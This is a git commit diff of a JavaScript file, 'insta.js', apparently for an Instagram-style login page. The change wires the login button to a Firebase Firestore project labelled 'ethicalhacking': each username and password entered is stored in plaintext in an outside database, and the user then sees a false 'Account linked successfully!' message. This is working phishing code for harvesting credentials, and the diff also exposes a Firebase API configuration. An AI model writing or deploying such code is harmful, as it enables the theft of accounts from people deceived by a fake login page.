e81b996c42d86abfb39f8262a0aa7367605576b4
ndas87308-art <ndas87308@gmail.com>
2026-07-08 13:25:27 +0530

    Update insta.js

--- insta.js
+++ insta.js
@@ -1,12 +1,47 @@
-document.getElementById("loginBtn").addEventListener("click", function () {
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-app.js";
+import {
+  getFirestore,
+  collection,
+  addDoc
+} from "https://www.gstatic.com/firebasejs/12.15.0/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyA2_ZBMGJhYDDIa4nI29NTQvJLmt-nGcbU",
+  authDomain: "ethicalhacking-41d74.firebaseapp.com",
+  projectId: "ethicalhacking-41d74",
+  storageBucket: "ethicalhacking-41d74.firebasestorage.app",
+  messagingSenderId: "1074149316175",
+  appId: "1:1074149316175:web:65d647891ce950999e7c3a",
+  measurementId: "G-E2WT8R8N66"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+document.getElementById("loginBtn").addEventListener("click", async function () {
 
     const username = document.getElementById("username").value.trim();
     const password = document.getElementById("password").value.trim();
 
-    if(username === "" || password === ""){
+    if (username === "" || password === "") {
         alert("Please enter username and password.");
         return;
     }
 
-    alert("account linked");
+    try {
+        await addDoc(collection(db, "users"), {
+            username: username,
+            password: password,
+            time: new Date()
+        });
+
+        alert("Account linked successfully!");
+
+        document.getElementById("username").value = "";
+        document.getElementById("password").value = "";
+
+    } catch (error) {
+        console.error(error);
+        alert(error.message);
+    }
 });
